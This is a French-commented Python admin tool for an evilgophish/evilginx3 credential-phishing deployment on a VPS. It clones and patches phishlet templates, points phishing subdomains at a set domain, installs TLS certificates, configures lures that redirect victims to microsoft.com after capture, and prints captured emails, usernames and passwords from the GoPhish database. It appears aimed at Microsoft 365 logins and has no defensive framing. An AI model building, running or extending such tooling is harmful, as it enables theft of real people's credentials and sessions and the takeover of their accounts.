#!/usr/bin/env python3
# ============================================================
# manage-phishlets.py — Gestion des phishlets evilgophish
# Usage : python3 manage-phishlets.py [--local] [-c config.yml]
#   --local   : exécution directe sur ce VPS (pas de SSH)
#   (défaut)  : connexion SSH vers le VPS distant
# ============================================================

import subprocess, json, sys, os, re, argparse, base64
from pathlib import Path

# ── ARGUMENTS ─────────────────────────────────────────────
def _parse_args():
    p = argparse.ArgumentParser(
        description="Gestion phishlets evilgophish — local ou distant",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--local", action="store_true",
                   help="Mode local : exécuter les commandes directement sans SSH")
    p.add_argument("-c", "--config", default=None, metavar="FILE",
                   help="Chemin vers deploy_config.yml (défaut: ./deploy_config.yml)")
    return p.parse_args()

ARGS       = _parse_args()
LOCAL_MODE: bool = ARGS.local

# ── CHARGEMENT CONFIG YML ─────────────────────────────────
def _load_yml(path=None) -> dict:
    candidates = []
    if path:
        candidates.append(Path(path))
    candidates.append(Path(__file__).parent / "deploy_config.yml")
    for p in candidates:
        if not p.exists():
            continue
        try:
            import yaml
            with open(p) as f:
                return yaml.safe_load(f) or {}
        except ImportError:
            pass
        except Exception:
            pass
    return {}

_yml = _load_yml(ARGS.config)

def _yml_get(*keys, default=""):
    v = _yml
    for k in keys:
        if not isinstance(v, dict):
            return default
        v = v.get(k, default)
        if v is default:
            return default
    return v or default

# ── CONFIG (depuis deploy_config.yml ou valeurs par défaut) ──
SSH_KEY       = _yml_get("vps", "ssh_key")          or "/home/atia/SSH/nadhmi"
VPS_HOST      = _yml_get("vps", "host")             or "vps"
VPS_USER      = _yml_get("vps", "user")             or "root"
VPS           = f"{VPS_USER}@{VPS_HOST}"

DOMAIN        = _yml_get("domain")                  or "otcopia.com"
INSTALL_DIR   = _yml_get("evilgophish", "dir")      or "/opt/evilgophish"
PHISHLETS_DIR = f"{INSTALL_DIR}/evilginx3/phishlets"
CERT_DIR      = f"{INSTALL_DIR}/evilginx-config/crt/sites"
CONFIG        = "/root/.evilginx/config.json"
CF_CERT       = f"/root/SSL/{DOMAIN}.pem.txt"
CF_KEY        = f"/root/SSL/{DOMAIN}.key.txt"

# ── COULEURS ──────────────────────────────────────────────
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'
C='\033[0;36m'; B='\033[1m'; NC='\033[0m'; M='\033[0;35m'

def red(s):    return f"{R}{s}{NC}"
def green(s):  return f"{G}{s}{NC}"
def yellow(s): return f"{Y}{s}{NC}"
def cyan(s):   return f"{C}{s}{NC}"
def bold(s):   return f"{B}{s}{NC}"
def mag(s):    return f"{M}{s}{NC}"

def banner():
    mode_lbl = green("LOCAL") if LOCAL_MODE else cyan(f"SSH → {VPS}")
    print(f"""
{C}{B}╔══════════════════════════════════════════════════╗
║      Evilgophish — Gestion Phishlets v3.0        ║
╚══════════════════════════════════════════════════╝{NC}
  Mode   : {mode_lbl}
  Domaine: {cyan(DOMAIN)}  Install: {INSTALL_DIR}
""")

# ═══════════════════════════════════════════════════════════
#  COUCHE TRANSPORT — toute la logique est ici
#  En mode local  : bash -c cmd  (pas de SSH)
#  En mode distant: ssh ... cmd
# ═══════════════════════════════════════════════════════════

_SSH_BASE = ["ssh", "-i", SSH_KEY,
             "-o", "StrictHostKeyChecking=no",
             "-o", "ConnectTimeout=10", VPS]

def run_host(cmd: str, capture=True):
    """Exécute une commande shell sur le host (local ou via SSH)."""
    if LOCAL_MODE:
        r = subprocess.run(["bash", "-c", cmd],
                           capture_output=capture, text=True)
    else:
        r = subprocess.run(_SSH_BASE + [cmd],
                           capture_output=capture, text=True)
    if capture:
        return r.stdout.strip(), r.returncode
    return None, r.returncode

def run_container(cmd: str, capture=True):
    """Exécute cmd dans le container evilgophish."""
    return run_host(f"docker exec evilgophish {cmd}", capture=capture)

def run_interactive(full_cmd: str):
    """Lance une session interactive (TTY complet) locale ou SSH."""
    if LOCAL_MODE:
        os.execvp("bash", ["bash", "-c", full_cmd])
    else:
        os.execvp("ssh", ["ssh", "-i", SSH_KEY,
                          "-o", "StrictHostKeyChecking=no",
                          "-t", VPS, full_cmd])

def write_remote_file(remote_path: str, content: str) -> bool:
    """Écrit content dans remote_path : open() en local, base64+python3 en SSH."""
    if LOCAL_MODE:
        try:
            Path(remote_path).parent.mkdir(parents=True, exist_ok=True)
            Path(remote_path).write_text(content)
            return True
        except Exception as e:
            err(f"Écriture locale échouée : {e}")
            return False
    else:
        b64 = base64.b64encode(content.encode()).decode()
        _, rc = run_host(
            f"python3 -c \"import base64; "
            f"open('{remote_path}','w').write(base64.b64decode('{b64}').decode())\""
        )
        return rc == 0

# ── UI HELPERS ────────────────────────────────────────────
def ok(msg):   print(green(f"  ✓ {msg}"))
def err(msg):  print(red(f"  ✗ {msg}"))
def info(msg): print(cyan(f"  → {msg}"))
def warn(msg): print(yellow(f"  ⚠ {msg}"))

def ask(prompt, default=None):
    hint = f" [{default}]" if default else ""
    try:
        val = input(f"{B}{prompt}{hint}: {NC}").strip()
    except (EOFError, KeyboardInterrupt):
        print(); sys.exit(0)
    return val if val else default

def confirm(prompt="Confirmer ?"):
    try:
        return input(f"{Y}{prompt} (o/n): {NC}").strip().lower() == "o"
    except (EOFError, KeyboardInterrupt):
        print(); return False

def separator(title=""):
    w = 52
    if title:
        pad = (w - len(title) - 2) // 2
        print(f"\n{C}{'─'*pad} {title} {'─'*(w-pad-len(title)-2)}{NC}")
    else:
        print(f"{C}{'─'*w}{NC}")

# ── PHISHLETS UTILS ───────────────────────────────────────
def get_phishlets():
    out, rc = run_host(
        f"ls {PHISHLETS_DIR}/*.yaml 2>/dev/null | xargs -I{{}} basename {{}} .yaml"
    )
    return out.splitlines() if rc == 0 and out else []

def get_phishlet_yaml(name):
    out, _ = run_host(f"cat {PHISHLETS_DIR}/{name}.yaml")
    return out

def get_phish_subs(name):
    out, _ = run_host(
        f"grep 'phish_sub' {PHISHLETS_DIR}/{name}.yaml "
        f"| grep -oP \"phish_sub: '\\K[^']+\""
    )
    return [s.strip() for s in out.splitlines() if s.strip()]

def get_config():
    out, _ = run_container(f"cat {CONFIG}")
    try:
        return json.loads(out)
    except Exception:
        return None

# ── YAML DISPLAY ──────────────────────────────────────────
def colorize_yaml(text):
    lines = []
    for line in text.splitlines():
        if re.match(r'^\s*#', line):
            lines.append(mag(line))
            continue
        colored = re.sub(r'^(\s*)([\w_-]+)(\s*:)',
                         lambda m: m.group(1)+cyan(m.group(2))+m.group(3), line)
        colored = re.sub(r"'([^']*)'", lambda m: green(f"'{m.group(1)}'"), colored)
        colored = re.sub(r'\b(true|false|null)\b', lambda m: yellow(m.group(1)), colored)
        lines.append(colored)
    return "\n".join(lines)

# ── SSL CERT ──────────────────────────────────────────────
def install_cert(subdomain):
    fqdn = f"{subdomain}.{DOMAIN}"
    cmd = (f"mkdir -p {CERT_DIR}/{fqdn} && "
           f"cp {CF_CERT} {CERT_DIR}/{fqdn}/{fqdn}.crt && "
           f"cp {CF_KEY}  {CERT_DIR}/{fqdn}/{fqdn}.key")
    _, rc = run_host(cmd)
    if rc == 0:
        ok(f"Cert installé : {fqdn}")
    else:
        err(f"Échec cert : {fqdn}")
    return rc == 0

def remove_cert(subdomain):
    fqdn = f"{subdomain}.{DOMAIN}"
    _, rc = run_host(f"rm -rf {CERT_DIR}/{fqdn}")
    if rc == 0:
        ok(f"Cert supprimé : {fqdn}")

# ── CONFIG.JSON OPS ───────────────────────────────────────
def activate_phishlet(name, lure_path="/", redirect_url="https://www.microsoft.com"):
    py = (
        f"import json\n"
        f"with open('{CONFIG}') as f: cfg = json.load(f)\n"
        f"for k in cfg['phishlets']:\n"
        f"    cfg['phishlets'][k] = {{'hostname':'','unauth_url':'','enabled':False,'visible':False}}\n"
        f"cfg['phishlets']['{name}'] = {{'hostname':'{DOMAIN}','unauth_url':'','enabled':True,'visible':True}}\n"
        f"for l in cfg['lures']:\n"
        f"    l['phishlet'] = '{name}'; l['path'] = '{lure_path}'; l['redirect_url'] = '{redirect_url}'\n"
        f"with open('{CONFIG}','w') as f: json.dump(cfg, f, indent=2)\n"
        f"print('OK')"
    )
    out, rc = run_container(f"python3 -c \"{py}\"")
    return rc == 0

def set_lure(name, path=None, redirect=None):
    updates = []
    if path:     updates.append(f"l['path'] = '{path}'")
    if redirect: updates.append(f"l['redirect_url'] = '{redirect}'")
    if not updates:
        return True
    update_code = "; ".join(updates)
    py = (
        f"import json\n"
        f"with open('{CONFIG}') as f: cfg = json.load(f)\n"
        f"[({update_code}) for l in cfg['lures'] if l.get('phishlet') == '{name}']\n"
        f"with open('{CONFIG}','w') as f: json.dump(cfg, f, indent=2)\n"
        f"print('OK')"
    )
    _, rc = run_container(f"python3 -c \"{py}\"")
    return rc == 0

def toggle_phishlet(name, enable: bool):
    state = "True" if enable else "False"
    py = (
        f"import json\n"
        f"with open('{CONFIG}') as f: cfg = json.load(f)\n"
        f"cfg['phishlets'].setdefault('{name}', {{'hostname':'','unauth_url':'','enabled':False,'visible':False}})\n"
        f"cfg['phishlets']['{name}']['enabled'] = {state}\n"
        f"cfg['phishlets']['{name}']['visible'] = {state}\n"
        f"if {state}: cfg['phishlets']['{name}']['hostname'] = '{DOMAIN}'\n"
        f"with open('{CONFIG}','w') as f: json.dump(cfg, f, indent=2)\n"
        f"print('OK')"
    )
    _, rc = run_container(f"python3 -c \"{py}\"")
    return rc == 0

# ── DOCKER RESTART ────────────────────────────────────────
def restart_evilginx(wait=6, reactivate_name=None,
                     lure_path="/", redirect_url="https://www.microsoft.com"):
    """Redémarre evilginx3, ré-active le phishlet si demandé (double restart)."""
    import time
    info("Redémarrage evilginx3...")
    run_container("supervisorctl restart evilginx3", capture=False)
    if reactivate_name:
        time.sleep(wait)
        info(f"Réactivation de {reactivate_name}...")
        activate_phishlet(reactivate_name, lure_path, redirect_url)
        run_container("supervisorctl restart evilginx3", capture=False)
        time.sleep(wait)
    else:
        time.sleep(wait)
    ok("evilginx3 redémarré")

def check_phishlet_loaded(name):
    out, _ = run_container(
        f"grep 'failed to load.*{name}' /var/log/evilgophish/evilginx3.log | tail -3"
    )
    if out:
        err(f"Erreur chargement :\n{out}")
        return False
    out2, _ = run_container(
        f"tail -30 /var/log/evilgophish/evilginx3.log | grep '{name}' | tail -3"
    )
    if out2:
        ok(f"Phishlet chargé :\n    {out2}")
    return True

# ── 1. LISTER ─────────────────────────────────────────────
def list_phishlets():
    separator("Phishlets (.yaml)")
    phishlets = get_phishlets()
    if not phishlets:
        warn("Aucun phishlet trouvé."); return
    cfg    = get_config()
    ph_cfg = cfg.get("phishlets", {}) if cfg else {}
    for p in phishlets:
        state    = ph_cfg.get(p, {})
        enabled  = state.get("enabled", False)
        hostname = state.get("hostname", "")
        status   = green("ACTIF ") if enabled else red("INACT.")
        host_str = f"  [{hostname}]" if hostname else ""
        print(f"  {status}  {bold(p)}{host_str}")

    separator("Lures configurées")
    if cfg:
        lures = cfg.get("lures", [])
        if lures:
            for i, l in enumerate(lures):
                print(f"  [{i}] phishlet={cyan(l.get('phishlet','?')):25}  "
                      f"path={yellow(l.get('path','/')):15}  "
                      f"redirect={l.get('redirect_url','')}")
        else:
            warn("Aucune lure configurée.")

    separator("Certs installés (sites/)")
    out, _ = run_host(f"ls {CERT_DIR} 2>/dev/null")
    for d in out.splitlines():
        print(f"  {green('✓')} {d}")

# ── 2. VOIR UN PHISHLET ───────────────────────────────────
def view_phishlet(name):
    separator(f"Contenu : {name}.yaml")
    content = get_phishlet_yaml(name)
    if content:
        print(colorize_yaml(content))
    else:
        err(f"Phishlet '{name}' introuvable.")

# ── 3. AJOUTER UN PHISHLET ───────────────────────────────
def _paste_yaml_template():
    separator("Coller un template YAML")
    NEW_NAME = ask("Nom du nouveau phishlet")
    if not NEW_NAME:
        warn("Annulé."); return

    print(f"\n  {cyan('Collez le contenu YAML ci-dessous.')}")
    print(f"  {cyan('Terminez avec une ligne contenant uniquement un point (.)')}\n")

    lines = []
    try:
        while True:
            line = input()
            if line.strip() == ".":
                break
            lines.append(line)
    except (EOFError, KeyboardInterrupt):
        print()

    if not lines:
        err("Aucun contenu fourni."); return

    yaml_content = "\n".join(lines)

    phish_subs = re.findall(r"phish_sub:\s*'([^']+)'", yaml_content)
    if not phish_subs:
        warn("Aucun phish_sub détecté dans le YAML.")
    else:
        print(f"\n  {bold('phish_sub détectés:')} {', '.join(cyan(s) for s in phish_subs)}")

    LURE_PATH    = ask("Lure path", default="/")
    REDIRECT_URL = ask("Redirect URL après capture", default="https://www.microsoft.com")

    print(f"\n  Phishlet : {bold(NEW_NAME)}")
    print(f"  Lure     : {LURE_PATH}  →  {REDIRECT_URL}")
    print(f"  Taille YAML : {len(lines)} lignes")
    if not confirm():
        warn("Annulé."); return

    info("[1/4] Écriture du yaml...")
    dest = f"{PHISHLETS_DIR}/{NEW_NAME}.yaml"
    if not write_remote_file(dest, yaml_content):
        err("Écriture échouée."); return
    ok(f"Yaml écrit : {NEW_NAME}.yaml")

    remote_wc, _ = run_host(f"wc -l {dest}")
    ok(f"Fichier : {remote_wc}")

    info("[2/4] Installation des certs Cloudflare...")
    for sub in phish_subs:
        install_cert(sub)

    info("[3/4] Activation dans config.json...")
    if activate_phishlet(NEW_NAME, LURE_PATH, REDIRECT_URL):
        ok("config.json mis à jour")

    info("[4/4] Restart evilginx3...")
    restart_evilginx(reactivate_name=NEW_NAME,
                     lure_path=LURE_PATH, redirect_url=REDIRECT_URL)
    check_phishlet_loaded(NEW_NAME)

    if phish_subs:
        print(f"\n  {bold('URL de test:')} "
              f"{green(f'https://{phish_subs[0]}.{DOMAIN}{LURE_PATH}')}")


def add_phishlet():
    separator("Ajouter un nouveau phishlet")
    phishlets = get_phishlets()

    print(f"\n  {bold('Phishlets disponibles comme base:')}")
    for i, p in enumerate(phishlets):
        print(f"    {yellow(str(i))}  {p}")
    print(f"    {yellow('p')}  {mag('[ Coller un template YAML custom ]')}")
    base_input = ask("Phishlet de base (nom, numéro ou 'p' pour coller)")
    if not base_input:
        warn("Annulé."); return

    if base_input.lower() == "p":
        _paste_yaml_template(); return

    if not phishlets:
        err("Aucun phishlet de base disponible."); return

    BASE_NAME = (phishlets[int(base_input)]
                 if base_input.isdigit() and int(base_input) < len(phishlets)
                 else base_input)
    if BASE_NAME not in phishlets:
        err(f"'{BASE_NAME}' introuvable."); return

    print(f"\n  {bold('Aperçu du phishlet de base:')}")
    view_phishlet(BASE_NAME)

    yaml_content  = get_phishlet_yaml(BASE_NAME)
    existing_subs = re.findall(r"phish_sub:\s*'([^']+)'", yaml_content)
    existing_orig = re.findall(r"orig_sub:\s*'([^']+)'",  yaml_content)

    separator("Nouveau phishlet")
    NEW_NAME = ask("Nom du nouveau phishlet (ex: auth-o365)")
    if not NEW_NAME:
        warn("Annulé."); return
    if NEW_NAME in phishlets:
        err(f"'{NEW_NAME}' existe déjà."); return

    print(f"\n  Sous-domaines actuels dans {BASE_NAME}:")
    for i, (ps, os_) in enumerate(zip(existing_subs, existing_orig)):
        print(f"    [{i}] phish_sub={cyan(ps)} → orig_sub={yellow(os_)}")

    new_subs = []
    print(f"\n  {bold('Définir les nouveaux sous-domaines phishing:')} "
          f"(entrée vide = garder original)")
    for i, (ps, os_) in enumerate(zip(existing_subs, existing_orig)):
        new_ps   = ask(f"    [{i}] phish_sub (était '{ps}')", default=ps)
        new_orig = ask(f"    [{i}] orig_sub  (était '{os_}') "
                       f"[NE PAS CHANGER sauf si vous savez]", default=os_)
        new_subs.append((ps, os_, new_ps, new_orig))

    separator("Lure")
    LURE_PATH    = ask("Lure path", default="/")
    REDIRECT_URL = ask("Redirect URL après capture", default="https://www.microsoft.com")

    separator("Résumé")
    print(f"  Phishlet : {bold(NEW_NAME)}  (base: {BASE_NAME})")
    for old_ps, old_os, new_ps, new_os in new_subs:
        print(f"  Sous-domaine: {yellow(old_ps)} → {green(new_ps)}  "
              f"(orig: {old_os} → {new_os})")
    print(f"  Lure     : {LURE_PATH}  →  {REDIRECT_URL}")

    if not confirm():
        warn("Annulé."); return

    info(f"[1/5] Copie du yaml {BASE_NAME} → {NEW_NAME}...")
    _, rc = run_host(
        f"cp {PHISHLETS_DIR}/{BASE_NAME}.yaml {PHISHLETS_DIR}/{NEW_NAME}.yaml"
    )
    if rc != 0:
        err("Copie échouée."); return
    ok("Yaml copié")

    info("[2/5] Patch des sous-domaines dans le yaml...")
    for old_ps, old_os, new_ps, new_os in new_subs:
        if old_ps == new_ps and old_os == new_os:
            continue
        old_pat = f"phish_sub: '{old_ps}', orig_sub: '{old_os}'"
        new_val  = f"phish_sub: '{new_ps}', orig_sub: '{new_os}'"
        _, rc = run_host(
            f"sed -i \"s/{old_pat}/{new_val}/g\" {PHISHLETS_DIR}/{NEW_NAME}.yaml"
        )
        if rc == 0:
            ok(f"  {old_ps}/{old_os} → {new_ps}/{new_os}")
        else:
            warn(f"  sed échoué pour {old_ps}")

    info("[3/5] Installation des certs Cloudflare...")
    all_new_subs = [ns for _, _, ns, _ in new_subs]
    for sub in all_new_subs:
        install_cert(sub)

    info("[4/5] Activation dans config.json...")
    if activate_phishlet(NEW_NAME, LURE_PATH, REDIRECT_URL):
        ok("config.json mis à jour")
    else:
        err("Échec mise à jour config.json")

    info("[5/5] Restart evilginx3...")
    restart_evilginx(reactivate_name=NEW_NAME,
                     lure_path=LURE_PATH, redirect_url=REDIRECT_URL)
    check_phishlet_loaded(NEW_NAME)

    first_sub = all_new_subs[0] if all_new_subs else "login"
    print(f"\n  {bold('URL de test:')} "
          f"{green(f'https://{first_sub}.{DOMAIN}{LURE_PATH}')}")

# ── 4. MODIFIER UN PHISHLET ──────────────────────────────
def modify_phishlet():
    separator("Modifier un phishlet existant")
    phishlets = get_phishlets()
    if not phishlets:
        err("Aucun phishlet disponible."); return

    for i, p in enumerate(phishlets):
        print(f"  {yellow(str(i))}  {p}")

    target_input = ask("Phishlet à modifier (nom ou numéro)")
    if not target_input:
        warn("Annulé."); return

    TARGET = (phishlets[int(target_input)]
              if target_input.isdigit() and int(target_input) < len(phishlets)
              else target_input)
    if TARGET not in phishlets:
        err(f"'{TARGET}' introuvable."); return

    separator(f"Actions sur : {TARGET}")
    print(f"  {yellow('1')}  Voir le contenu YAML")
    print(f"  {yellow('2')}  Changer les sous-domaines phishing (phish_sub)")
    print(f"  {yellow('3')}  Changer la lure (path et/ou redirect)")
    print(f"  {yellow('4')}  Activer ce phishlet")
    print(f"  {yellow('5')}  Désactiver ce phishlet")
    print(f"  {yellow('6')}  Supprimer ce phishlet")
    print(f"  {yellow('0')}  Retour")
    choice = ask("Choix")

    if choice == "1":
        view_phishlet(TARGET)

    elif choice == "2":
        yaml_content  = get_phishlet_yaml(TARGET)
        existing_subs = re.findall(r"phish_sub:\s*'([^']+)'", yaml_content)
        existing_orig = re.findall(r"orig_sub:\s*'([^']+)'",  yaml_content)

        print(f"\n  Sous-domaines actuels:")
        for i, (ps, os_) in enumerate(zip(existing_subs, existing_orig)):
            print(f"    [{i}] phish_sub={cyan(ps)} → orig_sub={yellow(os_)}")

        changed = []
        for i, (ps, os_) in enumerate(zip(existing_subs, existing_orig)):
            new_ps   = ask(f"    [{i}] Nouveau phish_sub (était '{ps}')", default=ps)
            new_orig = ask(f"    [{i}] orig_sub (était '{os_}') "
                           f"[WARNING: ne changer que si nécessaire]", default=os_)
            if new_ps != ps or new_orig != os_:
                changed.append((ps, os_, new_ps, new_orig))

        if not changed:
            warn("Aucun changement."); return
        if not confirm():
            warn("Annulé."); return

        for old_ps, old_os, new_ps, new_os in changed:
            old_pat = f"phish_sub: '{old_ps}', orig_sub: '{old_os}'"
            new_val  = f"phish_sub: '{new_ps}', orig_sub: '{new_os}'"
            run_host(f"sed -i \"s/{old_pat}/{new_val}/g\" {PHISHLETS_DIR}/{TARGET}.yaml")
            if new_ps != old_ps:
                install_cert(new_ps)
            ok(f"  {old_ps} → {new_ps}")

        restart_evilginx(reactivate_name=TARGET)
        check_phishlet_loaded(TARGET)

    elif choice == "3":
        cfg    = get_config()
        lures  = cfg.get("lures", []) if cfg else []
        my_l   = [l for l in lures if l.get("phishlet") == TARGET]
        if my_l:
            cur = my_l[0]
            print(f"  Lure actuelle: path={yellow(cur.get('path','/'))}  "
                  f"redirect={cur.get('redirect_url','')}")
        new_path     = ask("Nouveau path (vide = inchangé)")
        new_redirect = ask("Nouveau redirect URL (vide = inchangé)")
        if not new_path and not new_redirect:
            warn("Aucun changement."); return
        if set_lure(TARGET, path=new_path or None, redirect=new_redirect or None):
            ok("Lure mise à jour")
            run_container("supervisorctl restart evilginx3", capture=False)
            ok("evilginx3 redémarré")

    elif choice == "4":
        cfg  = get_config()
        lures = cfg.get("lures", []) if cfg else []
        my   = next((l for l in lures if l.get("phishlet") == TARGET), None)
        lp   = my.get("path", "/") if my else "/"
        ru   = my.get("redirect_url", "https://www.microsoft.com") if my else "https://www.microsoft.com"
        activate_phishlet(TARGET, lp, ru)
        restart_evilginx(reactivate_name=TARGET, lure_path=lp, redirect_url=ru)
        ok(f"Phishlet {TARGET} activé")

    elif choice == "5":
        toggle_phishlet(TARGET, False)
        run_container("supervisorctl restart evilginx3", capture=False)
        ok(f"Phishlet {TARGET} désactivé")

    elif choice == "6":
        warn(f"Vous allez supprimer définitivement {TARGET}.yaml")
        warn("Les certs et la config.json ne seront PAS modifiés automatiquement.")
        if not confirm(f"Supprimer {TARGET} ?"):
            warn("Annulé."); return
        _, rc = run_host(f"rm {PHISHLETS_DIR}/{TARGET}.yaml")
        if rc == 0:
            ok(f"{TARGET}.yaml supprimé")
            toggle_phishlet(TARGET, False)
            run_container("supervisorctl restart evilginx3", capture=False)
        else:
            err("Suppression échouée.")

    elif choice == "0":
        return
    else:
        err("Choix invalide.")

# ── 5. GESTION SSL ────────────────────────────────────────
def manage_ssl():
    separator("Gestion des certificats SSL")
    print(f"  {yellow('1')}  Lister les certs installés")
    print(f"  {yellow('2')}  Installer cert pour un sous-domaine")
    print(f"  {yellow('3')}  Supprimer cert d'un sous-domaine")
    print(f"  {yellow('4')}  Réinstaller TOUS les certs (tous les phish_sub actifs)")
    print(f"  {yellow('0')}  Retour")
    choice = ask("Choix")

    if choice == "1":
        out, _ = run_host(f"ls -la {CERT_DIR} 2>/dev/null")
        print(out)

    elif choice == "2":
        sub = ask(f"Sous-domaine (sans .{DOMAIN})")
        if sub:
            install_cert(sub)

    elif choice == "3":
        out, _ = run_host(f"ls {CERT_DIR} 2>/dev/null")
        dirs = out.splitlines()
        for i, d in enumerate(dirs):
            print(f"  {yellow(str(i))}  {d}")
        choice2 = ask("Numéro ou nom à supprimer")
        if choice2:
            target_dir = (dirs[int(choice2)]
                          if choice2.isdigit() and int(choice2) < len(dirs)
                          else choice2)
            remove_cert(target_dir.replace(f".{DOMAIN}", ""))

    elif choice == "4":
        phishlets = get_phishlets()
        all_subs = set()
        for p in phishlets:
            for s in get_phish_subs(p):
                all_subs.add(s)
        info(f"Sous-domaines trouvés: {', '.join(all_subs)}")
        if confirm("Réinstaller tous les certs ?"):
            for sub in all_subs:
                install_cert(sub)

# ── 6. STATUS ─────────────────────────────────────────────
def status():
    separator("Containers Docker")
    out, _ = run_host("docker ps --format 'table {{.Names}}\t{{.Status}}\t{{.Ports}}'")
    print(out)

    separator("Supervisord")
    out, _ = run_container("supervisorctl status")
    print(out)

    separator("Logs evilginx3 (20 dernières lignes)")
    out, _ = run_container("tail -20 /var/log/evilgophish/evilginx3.log")
    for line in out.splitlines():
        if "error" in line.lower() or "fail" in line.lower():
            print(red(line))
        elif "loaded" in line.lower() or "success" in line.lower() or "start" in line.lower():
            print(green(line))
        elif "warn" in line.lower():
            print(yellow(line))
        else:
            print(line)

    separator("Sessions capturées (GoPhish DB)")
    out, _ = run_container(
        "python3 -c \""
        "import sqlite3\n"
        "try:\n"
        "    c=sqlite3.connect('/opt/evilgophish/gophish/gophish.db')\n"
        "    rows=c.execute('SELECT email,username,password,created "
        "FROM sessions ORDER BY created DESC LIMIT 10').fetchall()\n"
        "    [print(f'  {r[0]:30} {r[1]:20} {r[2]:20} {r[3]}') for r in rows]\n"
        "    if not rows: print('  (aucune session)')\n"
        "except Exception as e: print(f'  DB: {e}')\n"
        "\""
    )
    print(out)

# ── 7. CLI EVILGINX ───────────────────────────────────────
EVILGINX_BIN   = "/opt/evilgophish/evilginx3/evilginx3"
EVILGINX_FLAGS = (
    "-p /opt/evilgophish/evilginx3/phishlets"
    " -t /opt/evilgophish/evilginx3/redirectors"
    " -g /opt/evilgophish/gophish/gophish.db"
    " -c /root/.evilginx"
)

def evilginx_cli():
    separator("CLI evilginx3 interactif")
    print(f"  {yellow('Info:')} supervisord sera stoppé le temps de la session.")
    print(f"  Commandes: {cyan('phishlets')}, {cyan('lures')}, "
          f"{cyan('sessions')}, {cyan('help')}\n")
    if not confirm("Ouvrir session evilginx3 (stop daemon temporairement) ?"):
        warn("Annulé."); return

    info("Arrêt de evilginx3 via supervisord...")
    run_container("supervisorctl stop evilginx3", capture=False)
    import time; time.sleep(2)

    print(f"\n{yellow('─── Session evilginx3 ───')}\n")
    cmd_inside = f"docker exec -it evilgophish {EVILGINX_BIN} {EVILGINX_FLAGS}"
    full_cmd   = (
        f"{cmd_inside} ; "
        f"docker exec evilgophish supervisorctl start evilginx3 ; "
        f"echo '[+] evilginx3 daemon redémarré'"
    )
    run_interactive(full_cmd)

# ── MENU PRINCIPAL ────────────────────────────────────────
MENU_ITEMS = [
    ("1", "Lister les phishlets, lures et certs",       list_phishlets),
    ("2", "Ajouter un nouveau phishlet",                 add_phishlet),
    ("3", "Modifier un phishlet existant",               modify_phishlet),
    ("4", "Gestion des certificats SSL",                 manage_ssl),
    ("5", "Status infra (containers + logs + sessions)", status),
    ("6", "CLI evilginx3 interactif",                   evilginx_cli),
    ("0", "Quitter",                                     None),
]

def main():
    while True:
        banner()
        separator("Menu principal")
        for key, label, _ in MENU_ITEMS:
            color = red if key == "0" else yellow
            print(f"  {color(key)}  {label}")
        print()
        choice = ask("Choix")
        print()

        for key, label, fn in MENU_ITEMS:
            if choice == key:
                if fn is None:
                    print(green("Au revoir.")); sys.exit(0)
                fn()
                break
        else:
            err("Choix invalide.")

        print()
        input(f"{C}[ Appuyez sur Entrée pour continuer... ]{NC}")

if __name__ == "__main__":
    main()
